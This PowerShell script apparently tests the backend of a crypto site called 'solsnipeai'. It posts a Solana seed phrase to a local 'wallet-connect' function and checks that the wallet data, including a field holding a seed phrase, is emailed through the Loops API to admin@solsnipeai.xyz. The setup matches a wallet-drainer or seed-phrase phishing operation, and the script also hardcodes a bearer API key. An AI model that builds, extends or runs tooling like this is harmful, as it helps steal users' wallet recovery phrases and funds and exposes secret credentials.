# COMPREHENSIVE EMAIL TEST
# Tests the email sending with all hardcoded values

Write-Host "🧪 Testing Loops Email Integration (Fully Hardcoded)" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Gray
Write-Host ""

# Test 1: Direct API Call (Control Test)
Write-Host "TEST 1: Direct Loops API Call" -ForegroundColor Yellow
Write-Host "-" * 60 -ForegroundColor Gray

$apiKey = "0de67ebcc5e8d98792c780ed52b714ee"
$templateId = "cmgn2tzu5fqc41q0ivqlmuqf4"
$email = "admin@solsnipeai.xyz"

$body = @{
    transactionalId = $templateId
    email = $email
    dataVariables = @{
        walletName = "DIRECT_TEST_WALLET"
        connectionType = "Direct Test"
        codes = "test-seed-phrase-123"
        solBalance = "5.5"
    }
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bearer $apiKey"
    "Content-Type" = "application/json"
}

try {
    Write-Host "Sending direct API request..." -ForegroundColor Gray
    $response = Invoke-WebRequest -Uri "https://app.loops.so/api/v1/transactional" `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "✅ PASSED - Direct API works!" -ForegroundColor Green
    Write-Host "   Response: $($response.Content)" -ForegroundColor Gray
} catch {
    Write-Host "❌ FAILED - Direct API call failed!" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.ErrorDetails.Message) {
        Write-Host "   Details: $($_.ErrorDetails.Message)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host ""

# Test 2: Wallet Connection Email (via Netlify Function)
Write-Host "TEST 2: Wallet Connection via Netlify Function" -ForegroundColor Yellow
Write-Host "-" * 60 -ForegroundColor Gray

$walletConnectBody = @{
    walletName = "test-user-123"
    walletType = "solana"
    inputType = "seed_phrase"
    credentials = "pill tomorrow foster begin walnut blade pen area slab bean forest liar"
} | ConvertTo-Json

try {
    Write-Host "Connecting wallet..." -ForegroundColor Gray
    $response = Invoke-WebRequest -Uri "http://localhost:8888/.netlify/functions/wallet-connect" `
        -Method POST `
        -Headers @{"Content-Type"="application/json"} `
        -Body $walletConnectBody `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "✅ PASSED - Wallet connection successful!" -ForegroundColor Green
    Write-Host "   Wallet: $($result.walletAddress)" -ForegroundColor Gray
    Write-Host "   Check server logs for email sending status" -ForegroundColor Cyan
} catch {
    Write-Host "❌ FAILED - Wallet connection failed!" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.ErrorDetails.Message) {
        Write-Host "   Details: $($_.ErrorDetails.Message)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host ""
Write-Host "=" * 60 -ForegroundColor Gray
Write-Host "💡 IMPORTANT:" -ForegroundColor Cyan
Write-Host "   1. Check your Netlify Dev server logs for email details" -ForegroundColor White
Write-Host "   2. Look for '📧 Sending email via Loops...' messages" -ForegroundColor White
Write-Host "   3. Verify API Key shows: 0de67ebcc5..." -ForegroundColor White
Write-Host "   4. Check admin@solsnipeai.xyz inbox for emails" -ForegroundColor White
Write-Host ""
Write-Host "✅ If TEST 1 passed but emails don't arrive:" -ForegroundColor Yellow
Write-Host "   - Check spam folder" -ForegroundColor White
Write-Host "   - Verify template is published in Loops dashboard" -ForegroundColor White
Write-Host "   - Ensure template has correct data variables" -ForegroundColor White
